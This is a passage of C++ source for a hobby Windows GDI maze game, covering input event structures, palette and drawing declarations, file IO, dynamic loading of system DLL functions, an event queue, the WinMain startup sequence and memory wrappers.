  //(reserved)          = 0xC1 -> 0xDA,
  VKEY_OEM_4            = 0xDB, //misc. chars; varies by keyboard ('[','{' on US standard)
    VKEY_LBRACKET       = VKEY_OEM_4,
  VKEY_OEM_5            = 0xDC, //misc. chars; varies by keyboard ('\\','|' on US standard)
    VKEY_BSLASH         = VKEY_OEM_5,
  VKEY_OEM_6            = 0xDD, //misc. chars; varies by keyboard (']','}' on US standard)
    VKEY_RBRACKET       = VKEY_OEM_6,
  VKEY_OEM_7            = 0xDE, //misc. chars; varies by keyboard ('\'','\""' on US standard)
    VKEY_APOSTROPHE     = VKEY_OEM_7,
  VKEY_OEM_8            = 0xDF, //misc. chars; varies by keyboard
  //(reserved)          = 0xE0,
  //(misc.)             = 0xE1 -> 0xE7,
  //(unassigned)        = 0xE8,
  //(misc.)             = 0xE9 -> 0xFE,

};



// Mod[ifier]
union Event_Key_Mod { //2B
  // IMPORTANT:
  // Due to me having terminal couldn't-care-less syndrome,
  // I haven't implemented differenciating between the
  // left and right variants of shift, control, et cetera,
  // so both variants are set/unset when either are pressed/unpressed.
  // (Except lgui and rgui, since that's easier to detect???)
  // (ALSO ALTGRAPH ISN'T IMPLEMENTED AT ALL THANKS MICROSOFT)

  struct {
    u16 lshift    : 1;
    u16 rshift    : 1;
    u16 lctrl     : 1;
    u16 rctrl     : 1;
    u16 lalt      : 1;
    u16 ralt      : 1;
    u16 lgui      : 1;
    u16 rgui      : 1;
    u16 _unused   : 4;
    u16 numlock   : 1;
    u16 capslock  : 1;
    u16 altgraph  : 1;
    u16 scrollock : 1;
  };

  u16 all;

};



// Short for ""Key Symbol""
struct Event_Key_Sym { //8B
  union {
    Event_Key_Mod kmod;
    u16           kmods;
  };

  u8  _unused;
  u8   pkey; // Physical key code (named .scancode in SDL's Keysym struct)
  u8   vkey; // Virtual key code (named .sym in SDL's Keysym struct)
  bool pressed;
  bool ischar; // 'is event KEY_CHAR?', otherwise it's KEY_UP or KEY_DOWN
  bool repeat; // Y'know that thing where in a text editor you hold down a key?

};



struct Event_Key { //24B
  u32  type;
  u32 _unused_0;
  u64  timestamp; // Performance counter is used; see ""timeGetPerfCounter()""

  union {
    struct { // (Effectively a copy of Event_Key_Sym)
      u16  kmods;
      u8  _unused_1;
      u8   pkey;
      u8   vkey;
      bool pressed;
      bool ischar;
      bool repeat;
    };
    Event_Key_Sym sym;
  };

};

/*-EVENT_KEY-*/



/*+EVENT_MOUSE+*/

// Event_Mouse.button can use any combination of these OR'd (AKA |) together
enum Event_Mouse_ButtonEnum { // (These are bitmasks)
  MBUTTON_LEFT   = 0x01,
  MBUTTON_MIDDLE = 0x02,
  MBUTTON_RIGHT  = 0x04,
  MBUTTON_X1     = 0x08, // Those 2 buttons on the sides of most mice nowadays
  MBUTTON_X2     = 0x10,  //^^
  MBUTTON_CTRL   = 0x20, // 'Is the control key currently pressed?'
  MBUTTON_SHIFT  = 0x40, // 'Is the shift key currently pressed?'
};

// (EVENT_MOUSE_<H/V>WHEEL events use dx and dy!)
struct Event_Mouse { //32B
  u32  type;

  u8  _unused;
  u8   button;   // Flags for currently pressed buttons (Event_Mouse_ButtonEnum)
  bool pressed;  // Will be true if button is nonzero
  bool dblClick; // 'Is double click?' (ignored if cursor is trapped)

  u64  timestamp;

  f32  x;  // Coordinates relative to window
  f32  y;   //^^
  f32  dx; // Delta x (coordinates relative to last recorded x position)
  f32  dy; // Delta y (coordinates relative to last recorded y position)
  // (IF THE CURSOR IS TRAPPED, DELTAS WILL BE GIVEN AS-IS,
  //  WITHOUT BEING SCALED WITH RESPECT TO THE WINDOW'S CURRENT SIZE!)

};

/*-EVENT_MOUSE-*/



union Event { //32B (assuming Event_Mouse is the largest event bytes-wise)
  u32          type;

  Event_Common common;
  Event_Key    key;
  Event_Mouse  mouse;

};



// Populates *event_p with the contents of the first event in the event queue.
// Returns false if there were no events left in queue; true otherwise.
// (Calling this exclusively in the main thread is recommended)
bool pollEvent(Event* event_p = nullptr); // Burns events if event_p is nullptr



// Returns true if the mouse cursor is clipped within the window, and is hidden
bool is_cursor_trapped();





/*********************************** AUDIO ************************************/

// Don't edit this one, as it's the hardcoded max length of an audio buffer!
#define AUDIO_SAMPLES_MAX 4096



// Stereo audio samples as two 32-bit floats,
// where each of the two channels can be between -1.0 to 1.0
struct StereoF32 { f32 l,r; };



// The length of the audio stream's buffer, in samples
extern u32 audio_samples;

// The audio's sample rate, in hertz
extern u32 sample_rate;



#include ""sound_stuff.hpp""





/*********************************** VIDEO ************************************/

#define WINDOW_NAME ""Terrible Maze Game (\""esc\"" to toggle relative mouse mode)""

// If left at 4, window will initially appear 4x as big as canvas
#define WINDOW_RESMUL (4/2)

// Technically customizable, but keeping it at 256x144 makes it 16:9,
// while also taking advantage of the fact an x position can just be stored
// within exactly 1 byte. This is useful for several types of optimizations
//
// The next best thing would be to at least keep it a power of 2.
// For example, 512x288 would use the lowest 9 bits (2^9 = 512) as the x
// coordinate, and 64x36 would use the lowest 6 bits (2^6 = 64), et cetera.
#define CANVAS_W (256*2)
#define CANVAS_H (144*2)



// This assumes the canvas width is equal to 256
union PixelCoords {
  u16 v; // Full index

  struct { u8 x, y; };

  PixelCoords() : v(0) {}
  PixelCoords(u16 _v) : v(_v) {}
  PixelCoords(u8 _x, u8 _y) : x(_x), y(_y) {}

};



// Used for the pixel buffer. This corresponds to the 8-bit color palette
// initially set during initialization. However, this palette can be
// changed by setting entries in pixels_palette and calling update_palette().
// (Actually, update_palette doesn't necessarily need to use pixels_palette,
//  Which means you can hotswap completely separate palettes!)
//
// There is a grayscale section of the built-in palette,
// where shades increment every 16 units of the "".v"" member.
// (With a max of 255, so the grayscale is effectively ""MIN(x*16, 255)"")
union Color8 {
  u8 v; // Full pixel value

  struct {
    u8 r : 3;
    u8 g : 3;
    u8 b : 2;
  };

  Color8() : v(0) {}
  Color8(u8 _v) : v(_v) {}

};



// Used for setting pixels_palette.
// This struct is analagous to Win32's own RGBQUAD struct,
// but formatted to be a bit more readable and nicer-looking
//
// (Make sure to call update_palette() to apply any changes to the palette!)
union Color24 {
  // Full pixel value. Since this is a union, this 32-bit value takes
  // up the same space as the four 8-bit values below.
  // The purpose of using a union like this is that by setting v,
  // you are setting b,g,r, and _ at the same time!
  u32 v;

  // Before the C11 standard, anonymous structs (or unions for that matter)
  // were compiler-specific extensions, but virtually all modern compilers
  // allow this type of syntax, where structs that are directly declaring
  // the contents of a type (as opposed to defining a type that can be
  // replicated) without giving it a name.
  //
  // In this case, this effectively packages these four bytes to be in this
  // order, rather than reside in the same space (this is a union, after all!)
  struct {
    u8 b;
    u8 g;
    u8 r;
    u8 _; // (Unused; this is just padding to the nearest multiple of 32-bits)
  };

};



// Unlike most graphics APIs in the last 30 years, GDI on Windows uses bitmaps
// (which this buffer uses) stores pixels left-right bottom-up,
// and not left-right top-down (for some reason)!!!!!
extern Color8*  pixels;

// This is always 256 elements in length, since each pixel is an 8-bit index
// into this color palette (2^8(bits) = 256)
extern Color24* pixels_palette;

// This is true if the canvas's window has been closed; false otherwise
extern bool win_closed;



void canvas_present(bool immediate = true);

void canvas_clear(Color8 fill_color);

void close_window(); // Also triggers an EVENT_QUIT

// Updates the 256-color palette. It defaults to the built-in one,
// but not only can you edit the built-in palette, you can make this
// function use another palette, just in case you want to swap out
// entirely different palettes on the fly!
//
// Does nothing if new_palette is given as NULL.
// This also makes sure that no color beyond the 255th is changed.
// For example, if first_color is 255, and num_colors is 2,
// only a single color will be changed, since 255 is the last color index
//
// Returns true on success, false otherwise
bool update_palette(u32 first_color = 0, u32 num_colors = 256,
                    const Color24* new_palette = pixels_palette);

// Returns the current size of the window's *client* area,
// which is basically the space in the window where stuff is actually drawn
Point2d get_win_size();





/********************************** FILE IO ***********************************/

struct BinaryData {
  union { // The everything union~
    u8 *  data_u8;
    u16*  data_u16;
    u32*  data_u32;
    u64*  data_u64;

    s8 *  data_s8;
    s16*  data_s16;
    s32*  data_s32;
    s64*  data_s64;

    f32*  data_f32;
    f64*  data_f64;

    char* data_char;
    void* data_void = nullptr;
  };

  // Even if size is 0, data will always have at least a single byte of valid
  // allocated memory. This is because there is always one more byte allocated
  // than is requested, to make sure that data is only ever nullptr if
  // construction fails! (This extra byte will always be set to 0.)
  const size_t size;


  BinaryData(const char* file_path);

  // This will allocate _size bytes for data, before copying src to data
  //
  // (It is safe to pass nullptr to src, though that would make the struct
  //  instance sorta equivalent to a garbage-collected CoTaskMemAlloc().)
  BinaryData(const void* src, size_t _size);

  ~BinaryData();

};



// fileio_read allocates memory! use mem_free on the returned pointer after use!
void* fileio_read(const char* file_path, size_t* dataSize_p);

bool fileio_write(const char* file_path, const void* data,
                  size_t data_size, bool append = false);



#define FILEIO_SIZE_ERR 0xFFFFFFFFFFFFFFFF

size_t fileio_size(const char* file_path);

bool fileio_isreadonly(const char* file_path);

bool fileio_exists(const char* file_path);

bool fileio_delete(const char* file_path);





/*********************** DRAW STUFF (NOT WIN32-RELATED) ***********************/

// IMPORTANT:
// Refer to the comment right above the pixels buffer declaration,
// as bitmaps handled by these draw functions use the same formatting!
//
// Also, on all draw functions with a customizable destination,
// that destination must be at least the same length as the ""pixel""s buffer!



struct Triangle32 { //16B
  u32   a, b, c;
  Color8  color;
  u8 _unused[3];
};

struct Triangle16 { //8B
  u16  a, b, c;
  Color8 color;
  u8   _unused;
};

struct Triangle8 { //4B
  u8   a, b, c;
  Color8 color;
};

typedef Triangle32 Triangle;



#ifdef FONT_PICO8_USED
extern u8     font_pico8_packed[184];    // Initialized; font in compressed form
extern Color8 font_pico8[4 + 3*5 * 256]; // Uninitialized; must be unpacked into
#endif



// Returns false if either dst or src are nullptr; true otherwise
#ifdef UNPACK_FONT_USED
bool unpack_font(Color8* dst, const u8* src,
                 Color8 fontColor         = 0b11111111,  // White
                 Color8 transparencyColor = 0b11000111); // Magenta
#endif



#ifdef FONT_PICO8_USED
  #define DEFAULT_FONT font_pico8
#else
  #define DEFAULT_FONT nullptr
#endif /* FONT_PICO8_USED */



#ifdef DRAW_TEXT_USED

// Set x and/or y to this to center the text on that axis
#define CENTERED_TEXT (-2147483647) //aka 0x80000001

#define TEXT_ERROR_RECT {-1, -1, -1, -1}

void draw_char(u8 chr, s32 x, s32 y, // (Ignores CENTERED_TEXT)
               const Color8* font = DEFAULT_FONT,
               Color8* dst = pixels);

Rect2d get_text_rect(const char* str, s32 x, s32 y,
                     bool use_negative_position_margin = false,
                     const Color8* font = DEFAULT_FONT);

// Returns final rect of the text
Rect2d draw_text(const char* str, s32 x, s32 y, u32 maxLength = 0,
                 bool use_negative_position_margin = false,
                 const Color8* font = DEFAULT_FONT, Color8* dst = pixels);

#endif /* DRAW_TEXT_USED */



// THESE ARE NOT THREAD SAFE, SINCE THEY USE THE SAME BUFFER BETWEEN CALLS!
//
// (An underscore is used in _DRAW_TEXTF_USED to make
//  autocomplete on calls to DRAW_TEXTF more convenient)
#ifdef _DRAW_TEXTF_USED

#define TEXT_FMT_BUFFER_LEN 8192

// Also puts the contents of the format into the built-in destination buffer
Rect2d get_text_rectf(const char* str_fmt, s32 x, s32 y,
                      bool use_negative_position_margin = false,
                      const Color8* font = DEFAULT_FONT, ...);

// (Variadic args version)
Rect2d get_text_rectvf(const char* str_fmt, s32 x, s32 y, va_list va,
                       bool use_negative_position_margin = false,
                       const Color8* font = DEFAULT_FONT);

// Draws the current contents of the built-in destination buffer
Rect2d draw_current_textf_buffer(s32 x, s32 y, u32 maxLength = 0,
                                 bool use_negative_position_margin = false,
                                 const Color8* font = DEFAULT_FONT,
                                 Color8* dst = pixels);

#define DRAW_TEXTF(_fmt, _x, _y, _npm, ...) \
  draw_textf(_fmt, (_x), (_y), 0, (_npm), DEFAULT_FONT, pixels, __VA_ARGS__)

Rect2d draw_textf(const char* str_fmt, s32 x, s32 y, u32 maxLength = 0,
                  bool use_negative_position_margin = false,
                  const Color8* font = DEFAULT_FONT,
                  Color8* dst = pixels, ...);

#endif /* _DRAW_TEXTF_USED */



// Blits a bitmap, where the first two bytes are its width and height,
// the third byte corresponding to its transparent color,
// the fourth byte corresponding to flags (unused by this function),
// the fifth and sixth bytes are position offsets (of type s8),
// the seventh and eighth bytes are padding and are currently unused,
// with the bytes after being the pixels.
#ifdef BLIT_USED
void blit(s32 x, s32 y, const Color8* src, Color8* dst = pixels);
#endif



#ifdef DRAW_LINE_USED
void draw_line(s32 x_0, s32 y_0,
               s32 x_1, s32 y_1,
               Color8 color,
               Color8* dst = pixels);
#endif



#ifdef DRAW_RECT_USED
void draw_rect(s32 x, s32 y,
               s32 w, s32 h,
               Color8 color,
               Color8* dst = pixels);
#endif

#ifdef FILL_RECT_USED
void fill_rect(s32 x, s32 y,
               s32 w, s32 h,
               Color8 color,
               Color8* dst = pixels);
#endif



// Sretches a vertical column of the source's pixels,
// using nearest-neighbor interpolation
#ifdef DRAW_VSLICE_USED
void draw_vslice(s32  dst_x, f32 height,
                 f32 _src_x, const Color8* src,
                 Color8* dst = pixels);
#endif





/* TBD
void fill_tri(f32 x_0, f32 y_0,
              f32 x_1, f32 y_1,
              f32 x_2, f32 y_2,
              Color8 color);

void fill_tris(const Fpoint3d* verts,
               const Triangle* tris, u32 tris_len);

void fill_tris2(const Fpoint3d* verts, const Triangle* tris,
                const u32*    indices, u32      indices_len);
*/





#endif /* _PUBLIC_STUFF_HPP */
"
Y99D6vFF,work for 2025-04-25 (3/5),Kitomas,C++,Friday 25th of April 2025 05:01:19 AM CDT,"/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\fileio.cpp"":
#include <windows.h>

#include <public_stuff.hpp>





BinaryData::BinaryData(const char* file_path)
  : size( fileio_size(file_path) )
{
  data_void = nullptr;
  if(size == FILEIO_SIZE_ERR) return;

  size_t _size;
  data_void = fileio_read(file_path, &_size);

  if(_size != size){ // Just in case
    mem_free(&data_void);
  }

}





BinaryData::BinaryData(const void* src, size_t _size)
  : size( _size )
{
  data_void = mem_alloc(size+1);
  if(data_void == nullptr) return; // Failed to allocate memory for data

  // Adding +1 to the Alloc size makes it so that I can always
  // make sure that the file's data is null-terminated, like so:
  data_char[size] = 0;

  if(src != nullptr) mem_copy(data_char, src, size);

}





BinaryData::~BinaryData(){
  mem_free(&data_void);

}





/******************************************************************************/





void* fileio_read(const char* file_path, size_t* dataSize_p){
  size_t size = fileio_size(file_path);
  if(size == FILEIO_SIZE_ERR) return nullptr;



  // Open the file
  HANDLE fileHandle = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
                                  nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);

  if(fileHandle == INVALID_HANDLE_VALUE) return nullptr; // Failed to open file



  // Allocate memory for file data
  void* data = mem_alloc(size+1);

  if(data == nullptr){  CloseHandle(fileHandle);  return nullptr;  }

  ((char*)data)[size] = 0;



  DWORD bytesRead;
  BOOL success = ReadFile(fileHandle, data, (DWORD)size, &bytesRead, nullptr);
  CloseHandle(fileHandle);

  if(!success  ||  bytesRead < size)
  {
    mem_free(&data);
    return nullptr;
  }



  if(dataSize_p != nullptr) *dataSize_p = size;

  return data;

}





bool fileio_write(const char* file_path, const void* data,
                  size_t data_size, bool append)
{
  if(file_path == nullptr  ||  data == nullptr) return false;

  // Writing files >=4GiB is currently unsupported!
  // (If you really wanted to, I guess you could write files larger than 4 gigs
  // with an overwrite and a series of appends, so that's always an option?)
  if(data_size >= 0xFFFFFFFF) return false;



  DWORD accessMode, creationDisposition;

  if(append){ // Create or append to existing
    accessMode          = FILE_APPEND_DATA;
    creationDisposition = OPEN_ALWAYS;

  } else { // Create or overwrite existing
    accessMode          = GENERIC_WRITE;
    creationDisposition = CREATE_ALWAYS;

  }



  HANDLE fileHandle = CreateFileA(file_path, accessMode, 0, nullptr,
                                  creationDisposition, FILE_ATTRIBUTE_NORMAL, nullptr);

  if(fileHandle == INVALID_HANDLE_VALUE) return false; // Failed to open file



  // If data_size *is* 0, then just create/open the file without writing to it

  if(data_size > 0){
    DWORD bytesWritten;
    BOOL success = WriteFile(fileHandle, data, (DWORD)data_size, &bytesWritten, nullptr);
    CloseHandle(fileHandle);
    if(!success) return false; // Failed to write to file
    if(bytesWritten < data_size) return false; // Bytes read was less than data_size

  } else {
    CloseHandle(fileHandle);

  }



  return true;

}





/******************************************************************************/





size_t fileio_size(const char* file_path){
  if(file_path == nullptr) return FILEIO_SIZE_ERR;

  HANDLE fileHandle = CreateFileA(file_path, 0, FILE_SHARE_READ, nullptr,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,nullptr);



  if(fileHandle == INVALID_HANDLE_VALUE){
    if(GetLastError() == ERROR_FILE_NOT_FOUND) return FILEIO_SIZE_ERR; // File not found
    else                                       return FILEIO_SIZE_ERR; // Failed to open file
  }



  LARGE_INTEGER fileSize;
  BOOL success = GetFileSizeEx(fileHandle, &fileSize);
  CloseHandle(fileHandle); // Close the file whether or not the query succeeds
  if(!success) return FILEIO_SIZE_ERR;

  return (size_t)fileSize.QuadPart;

}





#define IS_READONLY(_attributes) \
  ( (_attributes)&FILE_ATTRIBUTE_READONLY )

#define IS_DIRECTORY(_attributes) \
  ( (_attributes)&FILE_ATTRIBUTE_DIRECTORY )

#define IS_READONLY_FILE(_attributes) \
  ( IS_READONLY(_attributes) && !IS_DIRECTORY(_attributes) )

bool fileio_isreadonly(const char* file_path){
  if(file_path == nullptr) return false; // file_path is not a real string

  DWORD fileAttributes = GetFileAttributesA(file_path);

  if(fileAttributes == INVALID_FILE_ATTRIBUTES){
    if(GetLastError() != ERROR_FILE_NOT_FOUND) return false; // Failed to get file attributes
    else                                       return false; // File doesn't exist

  } else if(IS_READONLY_FILE(fileAttributes)){
    return true; // File is read-only

  } else {
    return false; // File is not read-only

  }

}





#define IS_NORMAL_FILE(_attributes) \
  ( !( IS_READONLY(_attributes) || IS_DIRECTORY(_attributes) ) )

bool fileio_exists(const char* file_path){
  if(file_path == nullptr) return false; // file_path is not a real string

  DWORD fileAttributes = GetFileAttributesA(file_path);

  if(fileAttributes == INVALID_FILE_ATTRIBUTES){
    if(GetLastError() != ERROR_FILE_NOT_FOUND) return false; // Failed to get file attributes
    else                                       return false;

  } else if(IS_NORMAL_FILE(fileAttributes)){
    return true;

  } else {
    return false; // Path exists, but is not associated with a normal file

  }

}





bool fileio_delete(const char* file_path){
  if(!fileio_exists(file_path)) return false; // File does not exist
  if(!DeleteFileA(file_path)  ) return false; // Failed to delete file

  return true;

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\functions.cpp"":
#include <win32/audio.hpp>
#include <win32/video.hpp>





_Winmm_func_t _Winmm_func;

char _Winmm_names_a[] = // prefix = ""time""
  ""GetDevCaps\0""
  ""BeginPeriod\0""
  ""\0"";

char _Winmm_names_b[] = // prefix = ""waveOut""
//""GetNumDevs\0""
  ""GetDevCapsA\0""
//""GetVolume\0""
  ""SetVolume\0""
//""GetErrorTextA\0""
  ""Open\0""
//""Close\0""
  ""PrepareHeader\0""
//""UnprepareHeader\0""
  ""Write\0""
  ""Pause\0""
//""Restart\0""
//""Reset\0""
//""BreakLoop\0""
//""GetPosition\0""
//""GetPitch\0""
//""SetPitch\0""
//""GetPlaybackRate\0""
//""SetPlaybackRate\0""
//""GetID\0""
//""Message\0""
  ""\0"";





_User32_func_t _User32_func;

char _User32_names_a[] = // prefix = """"
  ""RegisterClassA\0""
  ""CreateWindowExA\0""
  ""DefWindowProcA\0""
  ""InvalidateRect\0""
  ""UpdateWindow\0""
  ""BeginPaint\0""
  ""EndPaint\0""
  ""PeekMessageA\0""
  ""DispatchMessageA\0""
  ""DestroyWindow\0""
//""ReleaseDC\0""
//""GetDC\0""
  ""PostQuitMessage\0""
  ""MessageBoxA\0""
  ""TranslateMessage\0""
  ""GetWindowLongA\0""
  ""AdjustWindowRectEx\0""
  ""LoadCursorA\0""
  ""MapVirtualKeyA\0""
//""GetCursorPos\0""
  ""ScreenToClient\0""
  ""ShowCursor\0""
  ""ClipCursor\0""
  ""GetClientRect\0""
  ""ClientToScreen\0""
  ""SetCapture\0""
  ""ReleaseCapture\0""
  ""SetCursorPos\0""
  ""RegisterRawInputDevices\0""
  ""GetRawInputData\0""
  ""\0"";



_Gdi32_func_t _Gdi32_func;

char _Gdi32_names_a[] = // prefix = """"
  ""CreateCompatibleDC\0""
  ""CreateDIBSection\0""
  ""SelectObject\0""
  ""DeleteObject\0""
  ""BitBlt\0""
  ""DeleteDC\0""
  ""StretchBlt\0""
  ""CreateCompatibleBitmap\0""
  ""SetStretchBltMode\0""
  ""SetDIBColorTable\0""
  ""CreateSolidBrush\0""
  ""\0"";
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\input.cpp"":
#include <win32/input.hpp>

#include <public_stuff.hpp>



CRITICAL_SECTION events_lock;
Event            events_queue[65536];
u16              events_next = 0;
u16              events_end  = 0;

Event_Key_Mod key_mods;
bool          key_states[256] = {0};

Point2d mouse_position = {0};
bool    mouse_was_moved_before = false;

bool cursor_trapped = false;
bool cursor_hidden = false;





extern HWND win;

int InputInit(){
  // This function has no failure condition
  InitializeCriticalSectionAndSpinCount(&events_lock, 2048);

  return 0;

}



void InputQuit(){}





// Returns false if queue is full
bool AddToEventQueue(Event& event){
  EnterCriticalSection(&events_lock);

  bool success = false;

  if((events_end+1) != events_next){
    events_queue[events_end++] = event;
    success = true;

  }

  LeaveCriticalSection(&events_lock);

  return success;

}



// Returns a EVENT_NULL event if queue is empty
Event RemoveFromEventQueue(){
  EnterCriticalSection(&events_lock);

  Event event;
  event.type = EVENT_NULL;

  if(events_next != events_end)
    event = events_queue[events_next++];

  LeaveCriticalSection(&events_lock);

  return event;

}





// Calling this exclusively in the main thread is recommended
bool pollEvent(Event* event_p){
  // Take one event off the current event queue and set it to *event_p
  EnterCriticalSection(&events_lock);

  Event event = RemoveFromEventQueue();

  LeaveCriticalSection(&events_lock);



  // If previous event queue is now empty, process any pending window messages,
  // while adding any events generated by WindowProc to the event queue
  if(events_next == events_end){
    MSG message;

    while(PeekMessageA(&message, nullptr, 0, 0, PM_REMOVE)){
      TranslateMessage(&message);
      DispatchMessageA(&message);

    }

  }



  if(event_p != nullptr) *event_p = event;

  return event.type != EVENT_NULL;

}





bool is_cursor_trapped(){
  return cursor_trapped; // Yep, that's all it does

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\main.cpp"":
#include <win32/audio.hpp>
#include <win32/video.hpp>
#include <win32/input.hpp>

#include <public_stuff.hpp>





static HMODULE _Ole32_dll;
static HMODULE _Winmm_dll;
static HMODULE _User32_dll;
static HMODULE _Gdi32_dll;





int user_main(int argc, char** argv);





// Doing ""*((FARPROC*)&_name)"" to work around not
// being able to directly cast an lvalue.
// (This is only really useful for isolated function pointers.)
#define LOAD_FUNC(_pre, _post, _name, _dll) \
  *((FARPROC*)&_name) = loadFunction(_pre, _post, _dll)



char _functionNameBuffer[256];

FARPROC loadFunction(const char* prefix, const char* postfix, HMODULE dll){
  strnCpy(_functionNameBuffer, prefix, 255);
  strCat(_functionNameBuffer, postfix);

  _functionNameBuffer[255] = 0; // Just in case

  return GetProcAddress(dll, _functionNameBuffer);

}



// Postfixes string should look like: ""nameA\0nameB\0nameC\0\0""
bool loadFunctions(const char* prefix, const char* postfixes, HMODULE dll,
                   FARPROC* funcs, int from)
{
  while(*postfixes != '\0'){
    if(!( funcs[from++] = loadFunction(prefix, postfixes, dll) ))
      return false;

    // +1 to get past null-terminator
    postfixes += strnLen(postfixes, 256)+1;

  }

  return true;

}





//





#define MAIN_ASSERT(_success, _code, _msg) \
  if(!(_success)){ \
    returnCode = (_code); \
    _printf(""ERROR: %s\n"", _msg); \
    goto _main_return; \
  }

int WINAPI WinMain(HINSTANCE hThisInst, HINSTANCE hPrevInst,
                   LPSTR     lpszArg,   int       nCmdShow)
{
  int err, returnCode = 0;

  // g++ doesn't seem to allow gotos that might maybe possibly step
  // over declarations, so the exit is near the top as a workaround
  if(0){ _main_return:
    // Seemingly due to WinMM being janky and old, in some environments the
    // program hangs indefinitely unless I explicitly exit the process like
    // this for some reason!
    ExitProcess((UINT)returnCode);
    return returnCode;
  }

  #ifdef _DEBUG
    f64 timeStart = timeGetSeconds();
  #endif /* _DEBUG */





  _Ole32_dll = LoadLibrary(""Ole32.dll"");
  MAIN_ASSERT(_Ole32_dll, -1, ""failed to load \""Ole32.dll\"""");

  _Winmm_dll = LoadLibrary(""Winmm.dll"");
  MAIN_ASSERT(_Winmm_dll, -2, ""failed to load \""Winmm.dll\"""");

  _User32_dll = LoadLibrary(""User32.dll"");
  MAIN_ASSERT(_User32_dll, -3, ""failed to load \""User32.dll\"""");

  _Gdi32_dll = LoadLibrary(""Gdi32.dll"");
  MAIN_ASSERT(_Gdi32_dll, -4, ""failed to load \""Gdi32.dll\"""");





  MAIN_ASSERT(loadFunctions(""time"", _Winmm_names_a, _Winmm_dll,
                            _Winmm_func.ptrs, 0), -11,
                            ""failed to load \""time\"" functions"");

  MAIN_ASSERT(loadFunctions(""waveOut"", _Winmm_names_b, _Winmm_dll,
                            _Winmm_func.ptrs, 2), -12,
                            ""failed to load \""waveOut\"" functions"");



  #define LOAD_USER32_FUNC(_prefix, _namegroup, _from, _errcode, _msg)         \
    MAIN_ASSERT(loadFunctions(_prefix, _User32_names_##_namegroup, _User32_dll,\
                              _User32_func.ptrs, (_from)), (_errcode), _msg)

  LOAD_USER32_FUNC("""", a, 0, -13, ""failed to load functions from User32"");



  #define LOAD_GDI32_FUNC(_prefix, _namegroup, _from, _errcode, _msg)        \
    MAIN_ASSERT(loadFunctions(_prefix, _Gdi32_names_##_namegroup, _Gdi32_dll,\
                              _Gdi32_func.ptrs, (_from)), (_errcode), _msg)

  LOAD_GDI32_FUNC("""", a, 0, -14, ""failed to load functions from Gdi32"");





  // Request 1ms minimum delay, to make timeSleep(16) reliably take 15 to 17 ms
  MAIN_ASSERT(!timeBeginPeriod(1), -50, ""failed to set timer resolution"");





  err = WaveOutInit(); // Also starts audio automatically
  MAIN_ASSERT(err == 0, err-100, ""failed to initialize waveOut device"");

  err = WindowInit(hThisInst);
  MAIN_ASSERT(err == 0, err-200, ""failed to initialize window & pixel buffer"");

  err = InputInit();
  MAIN_ASSERT(err == 0, err-300, ""failed to initialize event system"");



  #if defined(FONT_PICO8_USED) && defined(UNPACK_FONT_USED)
    unpack_font(font_pico8, font_pico8_packed);
  #endif

  #if defined(STDLIB_USED)
    srand(timeGetPerfCounter()&0xFFFFFFFF);
  #endif

  _printf(""Initialized in: %.4f seconds!\n"", timeGetSeconds()-timeStart);

  returnCode = user_main(0, nullptr); // TBD: provide main's arguments



  InputQuit();

  WindowQuit();

  WaveOutQuit();



  if(mem_getNumAllocations() > 0){
    _printf(""# OF ALLOCATIONS (THIS NUMBER SHOULD BE 0!): %llu\n"",
            mem_getNumAllocations());
  }



  // Make sure no unused parameter warnings occur for these
  (void)hThisInst;
  (void)hPrevInst;
  (void)lpszArg;
  (void)nCmdShow;

  goto _main_return;

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\memory.cpp"":
#include <public_stuff.hpp>


//turns something into a void**
 //(this makes some code here easier for me to read)
#define VPP(_ptr_p) ((void**)(_ptr_p))


size_t numAllocations = 0;





void* mem_alloc(size_t size){
  void* newHeapMemory = malloc(size);
  if(newHeapMemory != nullptr) ++numAllocations;
  return newHeapMemory;

}





void mem_free(void* ptr_p){
  if(VPP(ptr_p) != nullptr  &&  *VPP(ptr_p) != nullptr){
    --numAllocations;
    free(*VPP(ptr_p));
    *VPP(ptr_p) = nullptr;

  }

}




void* mem_realloc(void* ptr_p, size_t newSize){
  void* ptr_new = nullptr;

  if(VPP(ptr_p) != nullptr){
    ptr_new = realloc(*VPP(ptr_p), newSize);

    if(ptr_new != nullptr){
      if(*VPP(ptr_p) == nullptr) ++numAllocations;
      *VPP(ptr_p) = ptr_new;

    }

  }

  return ptr_new;

}





size_t mem_getNumAllocations(){ return numAllocations; }

size_t mem_setNumAllocations(size_t value){ return numAllocations = value; }

size_t mem_addNumAllocations(s32 amount){
  size_t originalState = numAllocations;

  numAllocations += amount;

  if(amount < 0  &&  numAllocations > originalState)
    numAllocations = 0; // Integer underflow protection

  return numAllocations;

}





// Currently just a wrapper, but now I can make my own implementation
// whenever I want, without replacing every call to memset with it
void* mem_set(void* ptr, s32 value, size_t size){
  if(ptr == nullptr) return nullptr; //now it's safe to pass nullptr :D
  return memSet(ptr, value, size);

}





void* mem_copy(void* destination, const void* source, size_t size){
  if(!destination || !source) return destination;
  return memCpy(destination, source, size);

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\misc.cpp"":
#include <windows.h>

#include <public_stuff.hpp>





extern HWND win;

u32 showMessageBox(const char* text, const char* title,
                   u32 type, u32 defaultButton)
{
  if(!text ) text  = """";
  if(!title) title = """";

  defaultButton = (defaultButton&3)<<8; //0x000 -> 0x300

  return MessageBoxA(win, text, title, type|defaultButton);

}





u64 timeGetPerfCounter(){
  u64 result;
  QueryPerformanceCounter((LARGE_INTEGER*)&result);
  return result;

}



static u64 perfFreq = 0;

u64 timeGetPerfFreq(){
  if(!perfFreq)
    QueryPerformanceFrequency((LARGE_INTEGER*)&perfFreq);

  return perfFreq;

}



f64 timeGetSeconds(){
  return (f64)timeGetPerfCounter()/timeGetPerfFreq();

}



void timeSleep(u32 milliseconds){
  Sleep((DWORD)milliseconds);

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\win32\std.cpp"":
#include <public_stuff.hpp>

#ifndef STDLIB_USED





